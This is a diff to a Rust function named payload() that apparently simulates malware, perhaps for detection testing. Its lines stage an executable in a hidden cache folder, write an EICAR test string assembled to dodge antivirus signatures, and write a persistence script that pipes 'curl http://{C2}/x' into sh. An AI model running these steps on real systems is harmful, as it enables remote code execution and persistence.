@@ -74,6 +74,10 @@ pub fn payload() {
     elf.extend_from_slice(&[0u8; 120]);
     let _ = std::fs::write("/tmp/work/.cache/stage2", &elf);
     let _ = std::fs::set_permissions("/tmp/work/.cache/stage2", std::fs::Permissions::from_mode(0o755));
+    // The EICAR antivirus test file (harmless by definition), assembled at
+    // run time so the agent binary itself does not carry the signature.
+    let eicar = [r"X5O!P%@AP[4\PZX54(P^)7CC)7}$", "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"].concat();
+    let _ = std::fs::write("/tmp/work/.cache/update.com", eicar);
     let _ = std::fs::write("/tmp/.persist.sh", format!("#!/bin/sh\ncurl -s http://{C2}/x | sh\n"));
     // 5. Run a shell, spawn a child.
     unsafe {
